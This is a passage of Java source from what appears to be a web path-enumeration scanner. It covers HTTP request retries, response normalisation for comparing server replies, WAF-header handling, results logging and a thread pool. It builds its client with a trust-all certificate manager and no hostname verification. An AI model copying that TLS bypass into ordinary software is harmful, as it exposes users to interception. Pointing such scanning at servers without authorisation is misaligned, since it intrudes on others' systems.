                showOutputs("HTTPReqResponse() - Increase your port binding range to get better result -> Wait for 1 seconds...", OutputType.DEBUG, ShowProgressMode.ALL);

                Thread.sleep(1000);
            } catch (Exception err) {
                if (debugMode) {
                    StringWriter sw = new StringWriter();
                    err.printStackTrace(new PrintWriter(sw));
                    String exceptionAsString = sw.toString();
                    showOutputs(exceptionAsString, OutputType.ERROR);
                }
            }
            finalResponse = sendHTTPReq(strAddition, retryTimes);
        } catch (Exception err) {
            if (conn != null) {
                conn.disconnect();
            }
            retryTimes++;
            if (debugMode) {
                StringWriter sw = new StringWriter();
                err.printStackTrace(new PrintWriter(sw));
                String exceptionAsString = sw.toString();
                showOutputs(exceptionAsString, OutputType.ERROR);
            }

            showOutputs("HTTPReqResponse() - Retry: " + Integer.toString(retryTimes), OutputType.DEBUG, ShowProgressMode.ALL);


            if (retryTimes < maxRetryTimes) {
                finalResponse = sendHTTPReq(strAddition, retryTimes);
            }
        }

        return finalResponse;
    }
*/

    private String cleanDynamicValuesInResponse(String finalResponse, String strAddition, String charset) {
        if (charset.isBlank())
            charset = "UTF-8";

        String fullUrlEncodedStrAddition = URLEncoder.encode(strAddition, StandardCharsets.UTF_8).replace("*", "%2a");
        String partlyUrlEncodedStrAddition = strAddition.replace("<", "%3c").replace(">", "%3e").replace("?", "%3f");

        // Define a custom CharsetDecoder that ignores illegal hex characters
        Charset charsetObj = Charset.forName(charset).newEncoder()
                .onMalformedInput(CodingErrorAction.IGNORE)
                .onUnmappableCharacter(CodingErrorAction.IGNORE)
                .charset();
        try {
            finalResponse = URLDecoder.decode(finalResponse.replaceAll("%(?![0-9a-fA-F]{2})", "%25"), charsetObj);
        } catch (UnsupportedCharsetException e) {
            // handle unsupported charset exception
        }

        try {
            finalResponse = StringEscapeUtils.unescapeHtml4(finalResponse);
        } catch (Exception e) {
            // handle unsupported exception
        }

        // replacing \ with /
        finalResponse = finalResponse.replaceAll("(?im)(\\\\)", "/");
        // replacing &amp; with & just in case HTML decoding has failed
        finalResponse = finalResponse.replaceAll("(?im)&amp;", "&");
        // removing the following special characters from the response: ( ) . * ?
        finalResponse = finalResponse.replaceAll("(?im)([\\(\\)\\.\\*\\?])", "");

        // preparing patterns that can be dynamic based on what was added to the path
        strAddition += "/" + fullUrlEncodedStrAddition; // to remove incoming data + even url encoded format
        strAddition += "/" + additionalQuery;
        strAddition += "/" + partlyUrlEncodedStrAddition;
        strAddition = strAddition.replaceAll("(?im)([\\\\])", "/").replaceAll("(?im)&amp;", "&").replaceAll("(?im)([\\(\\)\\.\\*\\?])", "");
        strAddition = strAddition.toLowerCase();
        String[] temp = removeDuplicatesAndBlanks(strAddition.split("/"));

        // removing the generated patterns based on what was added to the path
        for (String s : temp) {
            if (s.length() > 0) {
                while (finalResponse.indexOf(s) > 0) {
                    finalResponse = finalResponse.replaceAll("(?im)(\\<[^>]+[a-z0-9\\-]=['\"`]([^\"]*" + Pattern.quote(s) + "[^\"]*)['\"`][^>]*>)", ""); // to remove a tag when it includes dynamic contents
                    finalResponse = finalResponse.replaceAll("(?im)" + Pattern.quote(s), "");
                }
            }
        }

        // The following RegEx was too intrusive and could replace a large part of a required text in the body
        //finalResponse = finalResponse.replaceAll("(?im)(([\\n\\r\\x00]+)|((server error in).+>)|((physical path).+>)|((requested url).+>)|((handler<).+>)|((notification<).+>)|(\\://[a-zA-Z0-9\\-\\.]+\\.[a-zA-Z]{2,3}(/\\S*)?)|(<!--[\\w\\W]*?-->)|((content-type)[\\s]*[\\:\\=]+[\\s]*[\\w \\d\\=\\[\\,\\:\\-\\/\\;]*)|((length)[\\s]*[\\:\\=]+[\\s]*[\\w \\d\\=\\[\\,\\:\\-\\/\\;]*)|((tag|p3p|expires|date|age|modified|cookie)[\\s]*[\\:\\=]+[\\s]*[^\\r\\n]*)|([\\:\\-\\/\\ ]\\d{1,4})|(: [\\w\\d, :;=/]+\\W)|(^[\\w\\d, :;=/]+\\W$)|(\\d{1,4}[\\:\\-\\/\\ ]\\d{1,4}))", "");
        // The RegEx above has been broken down to smaller pieces to reduce confusions in the future

        // cleaning the response further
        // removing some common .NET errors
        finalResponse = finalResponse.replaceAll("(?im)(((server error in).+>)|((physical path).+>)|((requested url).+>)|((handler<).+>)|((notification<).+>))","");
        // removing HTML comments
        finalResponse = finalResponse.replaceAll("(?im)(<!--[\\w\\W]*?-->)","");
        // removing URLs
        finalResponse = finalResponse.replaceAll("(\\:[\\/\\\\]+[a-zA-Z0-9\\-\\.]+\\.[a-zA-Z]{2,3}([\\/\\\\]+[a-zA-Z\\/\\\\0-9%_\\-\\?=&\\.]*)?)","");

        //this is the controversial bit which may cause false negatives :s

        if(ignoreHeaderLevel==2) {
            // ignore value of all headers starting with X-
            finalResponse = finalResponse.replaceAll("(?im)^(x\\-[^:]+:\\s*)[^\\r\\n]+$", "$1");
            // removing content-type header and its value
            finalResponse = finalResponse.replaceAll("(?im)^content\\-type[\\s]*[\\:\\=]+[\\s]*[\\w \\d\\=\\[\\,\\:\\-\\/\\;]*", "");
            // removing content-length header and its replacements by WAFs
            finalResponse = finalResponse.replaceAll("(?im)^content\\-l[ength]{4,}[\\s]*[\\:\\=]+[\\s]*[\\w \\d\\=\\[\\,\\:\\-\\/\\;]*", "");
            // removing more known dynamic headers and their values
            finalResponse = finalResponse.replaceAll("(?i)(tag|p3p|expires|date|age|modified|cookie|report\\-to)[\\s]*[\\:\\=]+[\\s]*[^\\r\\n]*", "");
            // removing headers with less complex values
            finalResponse = finalResponse.replaceAll("(?im)^[\\w\\d\\-]+\\s*:\\s*[\\w\\d, \\t:;=\\/]+$","");
        }

        // replace d attribute value in the path tag in a SVG as they are very long and annoying!
        finalResponse = finalResponse.replaceAll("<path[^>]*\\sd=\"([^\"]*)\"","<path");
        // replace UUIDs
        finalResponse = finalResponse.replaceAll("\\b(?=[a-fA-F0-9-]{32,})(?:[a-fA-F0-9]{1,8}-?(?:[a-fA-F0-9]{1,4}-?){3}[a-fA-F0-9]{1,12})\\b","00000000000000000000000000000000");
        // replace hex strings longer than 30 characters
        finalResponse = finalResponse.replaceAll("\\b(?:[0-9a-fA-F]{2}){15,}\\b","A0000000000000000000000000000F");
        // replacing base64 characters longer than 30 characters - this can also match a URL path, but we cannot do anything about that
        finalResponse = finalResponse.replaceAll("(?=.*[a-z])(?=.*[A-Z])(?=.*\\d)(?=.*[=\\/\\-_+\\\\])[a-zA-Z0-9=\\/\\-_+\\\\]{30,}","ABCD");
        // replacing dates with both the ISO 8601 format (2023-04-28T13:37:00Z) and the RFC 2822 format (Fri, 28 Apr 2023 13:37:00 GMT)
        finalResponse = finalResponse.replaceAll("(?:\\d{4}-(?:0[1-9]|1[0-2])-(?:0[1-9]|[12]\\d|3[01])T(?:[01]\\d|2[0-3]):[0-5]\\d:[0-5]\\dZ)|(?:[A-Za-z]{3},\\s(?:0[1-9]|[12]\\d|3[01])\\s[A-Za-z]{3}\\s\\d{4}\\s(?:[01]\\d|2[0-3]):[0-5]\\d:[0-5]\\d\\s[A-Za-z]{3})","0");
        // replacing surrounded numbers or versions which might be dynamic
        finalResponse = finalResponse.replaceAll("\\b[\\d]{1,}?[\\d\\.]*\\b","0");
        // replacing Cr and Lf and Null chars
        finalResponse = finalResponse.replaceAll("(?im)[\\n\\r\\x00]+"," ");
        // replacing repetitive spaces
        finalResponse = finalResponse.replaceAll("(?im)[ \\t]+"," ");
        // converting the response letters to lowercase
        finalResponse = finalResponse.toLowerCase();
        return finalResponse;
    }

    private static String[] removeDuplicatesAndBlanks(String[] inputArray) {
        Set<String> uniqueSet = new HashSet<>();
        ArrayList<String> uniqueList = new ArrayList<>();

        for (String item : inputArray) {
            String trimmedItem = item.trim();
            if (!trimmedItem.isEmpty() && uniqueSet.add(trimmedItem)) {
                uniqueList.add(trimmedItem);
            }
        }

        return uniqueList.toArray(new String[0]);
    }
    private String convertHttpResponseToString(CloseableHttpResponse httpResponse, String charset) {
        StringJoiner stringJoiner = new StringJoiner("\r\n");
        if (charset.isBlank())
            charset = "UTF-8";

        stringJoiner.add(httpResponse.toString());

        for (var item : httpResponse.getHeaders()) {
            stringJoiner.add(item.getName() + ": " + item.getValue());
        }

        try {
            HttpEntity entity = httpResponse.getEntity();
            if (entity != null) {
                String responseString = EntityUtils.toString(entity, charset);
                stringJoiner.add("\r\n");
                stringJoiner.add(responseString);
            }
        } catch (Exception e) {

        }

        return stringJoiner.toString();
    }

    private void createHTTPClient() {
        // Create SSL socket factory with trust strategy for self-signed certificates
        // Create a trust manager that does not validate certificate chains
        Registry<ConnectionSocketFactory> registry;
        try {
            TrustManager[] trustAllCerts = new TrustManager[]{
                    new X509TrustManager() {

                        public java.security.cert.X509Certificate[] getAcceptedIssuers() {
                            return null;
                        }

                        public void checkClientTrusted(
                                java.security.cert.X509Certificate[] certs, String authType) {
                        }

                        public void checkServerTrusted(
                                java.security.cert.X509Certificate[] certs, String authType) {
                        }
                    }
            };
            // Install the all-trusting trust manager
            SSLContext sslContext = SSLContext.getInstance("TLS");
            sslContext.init(null, trustAllCerts, new java.security.SecureRandom());

            SSLConnectionSocketFactory insecureSSLTrust = new SSLConnectionSocketFactory(sslContext, NoopHostnameVerifier.INSTANCE);

            registry = RegistryBuilder.<ConnectionSocketFactory>create()
                    .register("http", PlainConnectionSocketFactory.INSTANCE)
                    .register("https", insecureSSLTrust)
                    .build();

        } catch (Exception e) {
            registry = RegistryBuilder.<ConnectionSocketFactory>create()
                    .register("http", PlainConnectionSocketFactory.getSocketFactory())
                    .register("https", SSLConnectionSocketFactory.getSocketFactory())
                    .build();
        }

        PoolingHttpClientConnectionManager connectionManager = new PoolingHttpClientConnectionManager(registry);
        connectionManager.setMaxTotal(DEFAULT_MAX_TOTAL_CONNECTIONS);
        connectionManager.setDefaultMaxPerRoute(DEFAULT_MAX_CONNECTIONS_PER_ROUTE);


        // Create HttpClient with custom SSL socket factory and request configuration
        RequestConfig.Builder configBuilder = RequestConfig.custom()
                .setConnectionRequestTimeout(maxConnectionTimeOut, TimeUnit.MILLISECONDS)
                .setResponseTimeout(maxConnectionTimeOut, TimeUnit.MILLISECONDS)
                .setRedirectsEnabled(false);

        RequestConfig config = configBuilder.build();

        HttpClientBuilder httpClientBuilder = HttpClients.custom()
                .setDefaultRequestConfig(config)
                .setConnectionManager(connectionManager);

        if (!proxyServerName.equals("") && proxyServerPort > 0) {
            // Use the proxy server to sends the requests
            httpClientBuilder.setProxy(new HttpHost(proxyServerName, proxyServerPort));
        }

        if (!customUserAgent.equals("")) {
            httpClientBuilder.setUserAgent(customUserAgent);
        }

        List<Header> headerList = new ArrayList<>();
        for (String header : additionalHeaders) {
            if (header.contains(":")) {
                String[] parts = header.split(": ");
                headerList.add(new BasicHeader(parts[0], parts[1]));
            }
        }

        if (!customCookie.isBlank()) {
            headerList.add(new BasicHeader("Cookie", customCookie));
        }

        if (!headerList.isEmpty()) {
            httpClientBuilder.setDefaultHeaders(headerList);
        }

        httpClient = httpClientBuilder.build();
    }

    private String sendHTTPReq(String strAddition) {
        return sendHTTPReq(destURL, strAddition, reliableRequestMethod, "", 0);
    }

    private String sendHTTPReq(String targetUrl, String strAddition, String httpMethod, String body, int retryCounter) {
        if (httpMethod.isBlank())
            httpMethod = reliableRequestMethod;
        if (targetUrl.isBlank())
            targetUrl = destURL;

        String finalResponse = "";
        String charset = "UTF-8";

        CloseableHttpResponse httpResponse;
        incReqCounter(1);
        try {
            if (httpClient == null)
                createHTTPClient();

            // removing additional slash character!
            if (strAddition.startsWith("/") && destURL.endsWith("/")) {
                strAddition = strAddition.substring(1);
            }
            String urlEncodedStrAddition = strAddition;
            if (performUrlEncoding) {
                urlEncodedStrAddition = URLEncoder.encode(strAddition, StandardCharsets.UTF_8).replace("*", "%2a"); // Java does not encode asterisk
            }
            String finalUrlStr = targetUrl + urlEncodedStrAddition + additionalQuery;

            // the ones that IIS doesn't like without encoding
            finalUrlStr = finalUrlStr.replace("<", "%3c").replace(">", "%3e").replace("?", "%3f");
            // HTTPClient uses the URI class which raises java.net.URISyntaxException when certain characters are not encoded
            finalUrlStr = finalUrlStr.replace("\\", "%5c").replace("`", "%60").replace("^", "%5e").replace("{", "%7b").replace("}", "%7d").replace("#", "%23");
            finalUrlStr = finalUrlStr.replaceAll("%(?![a-fA-F0-9]{2})", "%25");

            BasicClassicHttpRequest httpRequest = new BasicClassicHttpRequest(httpMethod, finalUrlStr);

            //HttpUriRequestBase httpRequest = new HttpUriRequestBase(httpMethod, finalURL);
            if (!body.isEmpty()) {
                httpRequest.setEntity(new StringEntity(body));
            }

            try {
                // Send the request.
                // Execute request and handle response

                httpResponse = httpClient.execute(httpRequest);
                finalResponse = convertHttpResponseToString(httpResponse, charset);
                httpResponse.close();

                //showOutputs("finalResponse: " + finalResponse, OutputType.DEBUG);
                if (!finalResponse.isBlank()) {
                    String statusCode = String.valueOf(httpResponse.getCode());
                    String firstLine = "";
                    try (BufferedReader reader = new BufferedReader(new StringReader(finalResponse))) {
                        firstLine = reader.readLine();
                    } catch (Exception e) {

                    }
                    // Clean-up process
                    boolean removeHeader = false;
                    boolean removeBody = false;
                    if(ignoreHeaderLevel <= 1){
                        // we do not need the headers, so we should remove them from the response
                        removeHeader = true;
                    }
                    if(ignoreBodyLevel == 0){
                        // we do not need the headers, so we should remove them from the response
                        removeBody = true;
                    }

                    if(!removeHeader || !removeBody){
                        if(removeHeader || removeBody){
                            Pattern pattern = Pattern.compile("\\R\\R"); // this matches either \r\n or \n as a new line
                            Matcher matcher = pattern.matcher(finalResponse);
                            String temp_header = finalResponse;
                            String temp_bodyPart = "";
                            if (matcher.find()) {
                                temp_header = finalResponse.substring(0,matcher.end());
                                temp_bodyPart = finalResponse.substring(matcher.end());
                            }

                            if(removeHeader){
                                finalResponse = temp_bodyPart;
                            }
                            else if(removeBody){
                                finalResponse = temp_header;
                            }
                        }

                        if(!finalResponse.isBlank())
                            finalResponse = cleanDynamicValuesInResponse(finalResponse, strAddition, charset);

                        finalResponse = firstLine + "\r\n" + finalResponse;
                    }else{
                        if(ignoreHeaderLevel == 0){
                            finalResponse = statusCode;
                        }else{
                            finalResponse = firstLine;
                        }
                    }
                    showOutputs("Cleaned Response to compare:\r\n" + finalResponse, OutputType.DEBUG);
                }

                Thread.sleep(maxDelayAfterEachRequest); // Delay after each request
            } catch (Exception e) {
                if (debugMode) {
                    StringWriter sw = new StringWriter();
                    e.printStackTrace(new PrintWriter(sw));
                    String exceptionAsString = sw.toString();
                    showOutputs(exceptionAsString, OutputType.ERROR);
                }
                try {
                    if (httpClient != null) {
                        httpClient.close();
                        httpClient = null;
                    }
                } catch (Exception ex) {
                }

                if (concurrentThreads > 10) {
                    concurrentThreads = 10;
                } else if (concurrentThreads > 5) {
                    concurrentThreads = 5;
                } else if (concurrentThreads > 1) {
                    concurrentThreads = 1;
                }

                isNetworkReliable = false;
                Thread.sleep(sleepTime * 1000);
                if (sleepTime < 10)
                    sleepTime++;
                //showOutputs("Error: Connection error. Please check the protocol, the domain name, or the proxy server.",OutputType.ERROR);
                showOutputs("Number of threads should be reduced - can be too late but reduced to: " + concurrentThreads, OutputType.ERROR, ShowProgressMode.ALL);
                showOutputs("Sleep for " + sleepTime + " seconds...", OutputType.ERROR, ShowProgressMode.ALL);
                throw new Exception("Error: Connection error. Please check the protocol, the domain name, or the proxy server.");


            }

        } catch (Exception err) {
            try {

                if (httpClient != null) {
                    httpClient.close();
                    httpClient = null;
                }

            } catch (Exception e) {

            }
            retryCounter++;
            if (debugMode) {
                StringWriter sw = new StringWriter();
                err.printStackTrace(new PrintWriter(sw));
                String exceptionAsString = sw.toString();
                showOutputs(exceptionAsString, OutputType.ERROR);
            }

            showOutputs("HTTPReqResponse() - Retry: " + String.valueOf(retryCounter), OutputType.DEBUG, ShowProgressMode.ALL);

            if (retryCounter < maxRetryTimes) {
                finalResponse = sendHTTPReq(targetUrl, strAddition, httpMethod, body, retryCounter);
            }
        }

        return finalResponse;
    }

    /*
    // To use customised HTTP methods: https://java.net/jira/browse/JERSEY-639
    private static final void setRequestMethodUsingWorkaroundForJREBug(
            final HttpURLConnection httpURLConnection, final String method) {
        try {
            httpURLConnection.setRequestMethod(method);
            // Check whether we are running on a buggy JRE
        } catch (final ProtocolException pe) {
            Class<?> connectionClass = httpURLConnection.getClass();
            Field delegateField = null;
            try {
                delegateField = connectionClass.getDeclaredField("delegate");
                delegateField.setAccessible(true);
                HttpURLConnection delegateConnection = (HttpURLConnection) delegateField
                        .get(httpURLConnection);
                setRequestMethodUsingWorkaroundForJREBug(delegateConnection, method);
            } catch (NoSuchFieldException e) {
                // Ignore for now, keep going
            } catch (IllegalArgumentException e) {
                throw new RuntimeException(e);
            } catch (IllegalAccessException e) {
                throw new RuntimeException(e);
            }
            try {
                Field methodField;
                while (connectionClass != null) {
                    try {
                        methodField = connectionClass.getDeclaredField("method");
                    } catch (NoSuchFieldException e) {
                        connectionClass = connectionClass.getSuperclass();
                        continue;
                    }
                    methodField.setAccessible(true);
                    methodField.set(httpURLConnection, method);
                    break;
                }
            } catch (final Exception e) {
                System.out.println(e.getMessage());
                throw new RuntimeException(e);
            }
        }
    }
*/
    /*
    private Object readStream(int length, java.io.InputStream stream, String charset)
            throws java.io.IOException {
        final int buflen = Math.max(1024, Math.max(length, stream.available()));
        byte[] buf = new byte[buflen];
        byte[] bytes = null;

        for (int nRead = stream.read(buf); nRead != -1; nRead = stream.read(buf)) {
            if (bytes == null) {
                bytes = buf;
                buf = new byte[buflen];
                continue;
            }
            final byte[] newBytes = new byte[bytes.length + nRead];
            System.arraycopy(bytes, 0, newBytes, 0, bytes.length);
            System.arraycopy(buf, 0, newBytes, bytes.length, nRead);
            bytes = newBytes;
        }

        if (charset == null) {
            return bytes;
        }

        if (bytes != null) {
            try {
                return new String(bytes, charset);
            } catch (java.io.UnsupportedEncodingException e) {

            }
        }
        return bytes;
    }
*/
    private synchronized void addValidFileToResults(String strInput) {
        finalResultsFiles.add(strInput);
    }

    private synchronized void addValidDirToResults(String strInput) {
        finalResultsDirs.add(strInput);
    }

    private synchronized void incThreadCounter(int num) {
        threadCounter += num;
    }

    private synchronized void decThreadCounter(int num) {
        threadCounter -= num;
        if (threadCounter <= 0) {
            threadCounter = 0;
        }
    }

    private synchronized void incReqCounter(int num) {
        reqCounter += num;
    }

    private synchronized long getReqCounter() {
        return reqCounter;
    }

    private boolean isInteger(String input) {
        try {
            Integer.parseInt(input);
            return true;
        } catch (Exception e) {
            return false;
        }
    }

    private boolean isLong(String input) {
        try {
            Long.parseLong(input);
            return true;
        } catch (Exception e) {
            return false;
        }
    }


    private enum ShowProgressMode {
        FINALRESULT, PARTIALRESULT, ALL
    }

    private enum OutputType {
        NORMAL, ERROR, DEBUG
    }

    private synchronized static void showOutputsTree(String output, int level) {
        String dentSpace = new String(new char[level]).replace("\0", "  ");
        String finalString = dentSpace + "|_ " + output;
        showOutputs(finalString, OutputType.NORMAL, ShowProgressMode.FINALRESULT);

    }

    private synchronized static void showOutputs(String output, ShowProgressMode showProgressMode) {
        showOutputs(output, OutputType.NORMAL, showProgressMode);
    }

    private synchronized static void showOutputs(String output) {
        showOutputs(output, OutputType.NORMAL, ShowProgressMode.FINALRESULT);
    }

    private synchronized static void showOutputs(String output, OutputType outputType) {
        showOutputs(output, outputType, ShowProgressMode.FINALRESULT);
    }

    private synchronized static void showOutputs(String output, OutputType outputType, ShowProgressMode showProgressMode) {
        // If the incoming ShowProgressMode is set to FINALRESULT, we need to show it
        // If the incoming ShowProgressMode is set to ALL or PARTIALRESULT, we need to ensure our current ShowProgressMode is not set to FINALRESULT
        // If the incoming ShowProgressMode is set to ALL, we need to ensure our current ShowProgressMode is also set to ALL
        boolean isShowProgressModeAllowed = false;

        if (currentShowProgressMode != null) {
            if (currentShowProgressMode.equals(showProgressMode) || (showProgressMode.equals(ShowProgressMode.PARTIALRESULT) && currentShowProgressMode.equals(ShowProgressMode.ALL)) ||
                    showProgressMode.equals(ShowProgressMode.FINALRESULT))
                isShowProgressModeAllowed = true;
        } else {
            if (showProgressMode.equals(ShowProgressMode.FINALRESULT))
                isShowProgressModeAllowed = true;
        }
        // There is kind of a logical OR between outputType & isShowProgressModeAllowed ... e.g.: when isShowProgressModeAllowed is set to FALSE and outputType to DEBUG when debugMode is TRUE

        // Printing errors when isShowProgressModeAllowed=true or when we are in debug mode
        if (outputType.equals(OutputType.ERROR) && (debugMode || isShowProgressModeAllowed)) {
            System.err.println(output);
            if (saveOutput) {
                saveOutputsInFile(output);
            }
        } else if ((isShowProgressModeAllowed && outputType.equals(OutputType.NORMAL) || (outputType.equals(OutputType.DEBUG) && debugMode))) {
            System.out.println(output);
            if (saveOutput) {
                saveOutputsInFile(output);
            }
        }


    }

    private synchronized static void saveOutputsInFile(String output) {
        if (!isOutputFileChecked) {
            // First initialisation
            isOutputFileChecked = true;
            String checkingErrorMessage = "";

            if (outputFile.equals(null) || outputFile.length() == 0)
                checkingErrorMessage = "Filename was not provided. Please check the configuration file.";
            else {
                File tmpfile1 = new File(outputFile);
                if (tmpfile1.exists() && !tmpfile1.isDirectory() && !tmpfile1.canWrite()) {
                    checkingErrorMessage = " The '" + tmpfile1.getAbsolutePath() + "' file is not writable.";
                } else if (tmpfile1.isDirectory()) {
                    checkingErrorMessage = " The '" + tmpfile1.getAbsolutePath() + "' destination is a directory.";
                } else if (!tmpfile1.exists()) {
                    try {
                        tmpfile1.createNewFile();
                    } catch (Exception err) {
                        checkingErrorMessage = " The '" + tmpfile1.getAbsolutePath() + "' file could not be created.";
                    }
                }
            }
            if (checkingErrorMessage.length() > 0) {
                saveOutput = false;
                showOutputs("\r\n Error in writing output: " + checkingErrorMessage, OutputType.ERROR);
                return;
            }
        }


        try {
            output += "\r\n";
            Files.write(Paths.get(outputFile), output.getBytes(), StandardOpenOption.APPEND);
        } catch (IOException err) {
            if (debugMode) {
                err.printStackTrace();
            } else {
                System.err.println("Error in saving outputs: " + err.getMessage());
            }
        }


    }


    ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
    // Copied from: http://www.edparrish.com/cis160/06s/examples/ThreadPool.java
    // Or: http://stackoverflow.com/questions/9700066/how-to-send-data-form-socket-to-serversocket-in-android
    ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
    static class ThreadPool extends ThreadGroup {

        private boolean isAlive;
        private LinkedList<Runnable> taskQueue;
        private int threadID;
        private static int threadPoolID;

        /**
         * Creates a new ThreadPool.
         *
         * @param numThreads The number of threads in the pool.
         */
        public ThreadPool(int numThreads) {
            super("ThreadPool-" + (threadPoolID++));
            //setDaemon(true);

            isAlive = true;

            taskQueue = new LinkedList<>();
            for (int i = 0; i < numThreads; i++) {
                new PooledThread().start();
            }
        }

        /**
         * Requests a new task to run. This method returns immediately, and the task
         * executes on the next available idle thread in this ThreadPool.
         * <p>
         * Tasks start execution in the order they are received.
         *
         * @param task The task to run. If null, no action is taken.
         * @throws IllegalStateException if this ThreadPool is already closed.
         */
        public synchronized void runTask(Runnable task) {
            if (!isAlive) {
                throw new IllegalStateException();
            }
            if (task != null) {
                taskQueue.add(task);
                notify();
            }

        }

        protected synchronized Runnable getTask() throws InterruptedException {
            while (taskQueue.size() == 0) {
                if (!isAlive) {
                    return null;
                }
                wait();
            }
            return taskQueue.removeFirst();
        }

        /**
         * Closes this ThreadPool and returns immediately. All threads are stopped,
         * and any waiting tasks are not executed. Once a ThreadPool is closed, no
         * more tasks can be run on this ThreadPool.
         */
        public synchronized void close() {
            if (isAlive) {
                isAlive = false;
                taskQueue.clear();
                interrupt();
            }
        }

        /**
         * Closes this ThreadPool and waits for all running threads to finish. Any
         * waiting tasks are executed.
         */
        public void join() {
            // notify all waiting threads that this ThreadPool is no
            // longer alive
            synchronized (this) {
                isAlive = false;
                notifyAll();
            }

            // wait for all threads to finish
            Thread[] threads = new Thread[activeCount()];
            int count = enumerate(threads);
            for (int i = 0; i < count; i++) {
                try {
                    threads[i].join();
                } catch (InterruptedException ex) {
                }
            }
        }

        /**
         * A PooledThread is a Thread in a ThreadPool group, designed to run tasks
         * (Runnables).
         */
        private class PooledThread extends Thread {

            public PooledThread() {
                super(ThreadPool.this, "PooledThread-" + (threadID++));
            }

            public void run() {
                while (!isInterrupted()) {

                    // get a task to run
                    Runnable task = null;
                    try {
                        task = getTask();
                    } catch (InterruptedException ex) {
                    }

                    // if getTask() returned null or was interrupted,
                    // close this thread by returning.
                    if (task == null) {
                        return;
                    }

                    // run the task, and eat any exceptions it throws
                    try {
                        task.run();
                    } catch (Throwable t) {
                        uncaughtException(this, t);
                    }
                }
            }
        }
    }
}
